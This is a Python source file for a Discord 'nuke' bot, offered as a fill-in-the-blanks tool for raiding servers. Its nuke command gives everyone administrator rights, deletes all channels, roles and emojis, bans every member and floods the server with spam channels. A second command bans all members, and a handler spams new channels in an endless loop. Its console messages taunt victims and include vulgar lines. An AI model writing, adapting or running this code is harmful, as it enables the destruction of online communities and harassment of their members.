import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
 
 
SPAM_CHANNEL = ["enter text here , "]
SPAM_MESSAGE = ["enter text here"]
 
bot = commands.Bot(command_prefix="enter prefix here",intents=discord.Intents.all())
 
@bot.event
async def on_ready():
  print(Fore.MAGENTA + 'enter text here' + Fore.RESET)
  await bot.change_presence(activity=discord.Game(name="enter text here"))
 
@bot.command()
async def nuke(ctx):
   await ctx.message.delete()
   guild = ctx.guild
   try:
     role = discord.utils.get(guild.roles, name = "@everyone")
     await role.edit(permissions = Permissions.all())
     print(Fore.MAGENTA + "gave everyone admin" + Fore.RESET)
   except:
     print(Fore.GREEN + "Created By valentines" + Fore.RESET)
   for channel in guild.channels:
     try:
       await channel.delete()
       print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
     except:
       print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
   for member in guild.members:
    try:
      await member.ban(True)
      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned while nuking for my daddy valentines" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{member.name}#{member.discriminator} is too flat to be banned." + Fore.RESET)
   for role in guild.roles:
    try:
      await role.delete()
      print(Fore.MAGENTA + f"{role.name} was deleted cuz valentines runs me" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{role.name} wasnt deleted and im super sorry daddy valentines" + Fore.RESET)
   for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(Fore.MAGENTA + f"{emoji.name} was deleted because valentines runs you" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{emoji.name} wasnt deleted and im super sorry daddy valentines :(" + Fore.RESET)
   banned_users = await guild.bans()
   for ban_entry in banned_users:
     user = ban_entry.user
     try:
       await user.unban("discord id")
       print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was banned." + Fore.RESET)
     except:
       print(Fore.GREEN + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
   await guild.create_text_channel("valentines runs u")
   for channel in guild.text_channels:
       link = await channel.create_invite(max_age = 0, max_uses = 0)
       print(f"New Invite: {link}")
   amount = 50
   for i in range(amount):
      await guild.create_text_channel(random.choice(SPAM_CHANNEL))
   print(f"nuked {guild.name} fucking losers")
   return
 
@bot.command()
async def banall(ctx):
 await ctx.message.delete()
 guild = ctx.guild
 for member in list(ctx.guild.members):
  try:
    await guild.ban(member)
    print(f"User" + member.name + f"Has been Banned From {ctx.guild.name}")
  except:
      pass
  print("Successfully Banned All")

@bot.event
async def on_guild_channel_create(channel):
 while True:
   await channel.send(random.choice(SPAM_MESSAGE))
 
bot.run  ("token", bot=True)
